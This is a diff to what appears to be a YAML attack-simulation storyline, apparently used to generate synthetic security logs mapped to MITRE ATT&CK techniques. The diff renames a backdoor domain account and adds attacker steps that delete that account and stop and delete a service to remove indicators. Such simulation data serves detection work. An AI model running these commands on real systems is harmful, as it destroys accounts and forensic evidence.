         process_name: "C:\\Windows\\System32\\net.exe"
-        command_line: "net user svc_mhsync /delete /domain"
+        command_line: "net user svc_dirsync /delete /domain"
         supplementary: none
         technique: "T1531 - Account Access Removal"
         description: "Delete backdoor domain account"
       - type: account_deleted
-        target_username: svc_mhsync
+        target_username: svc_dirsync
         technique: "T1531 - Account Access Removal"
         description: "Backdoor domain account deleted"
+
+  - id: evt-032b
+    time: "+5h52m"
+    actor: marcus.chen
+    system: DC-02
+    activity: "Attacker stops and deletes DirectoryCacheSvc from DC-02"
+    event_spacing:
+      mode: explicit_offsets
+      offsets: ["0s", "3s"]
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\sc.exe"
+        command_line: "sc.exe stop DirectoryCacheSvc"
+        technique: "T1070 - Indicator Removal"
+        description: "Stop the temporary DirectoryCacheSvc service"
+      - type: process
+        process_name: "C:\\Windows\\System32\\sc.exe"
+        command_line: "sc.exe delete DirectoryCacheSvc"
+        technique: "T1070 - Indicator Removal"
+        description: "Delete DirectoryCacheSvc and rely on command-derived audit companions"
 
   - id: evt-033
     time: "+5h55m"
@@ -1551,16 +1586,6 @@ storyline:
       - type: logoff
         technique: "T1078 - Valid Accounts"
         description: "Logoff from compromised workstation"
-
-  - id: evt-034
-    time: "+5h56m"
-    actor: svc_mhsync
-    system: FILE-SRV-01
-    activity: "Backdoor account session logs off FILE-SRV-01"
-    events:
-      - type: logoff
-        technique: "T1078 - Valid Accounts"
-        description: "Logoff from file server"
 
   - id: evt-035
     time: "+5h57m"
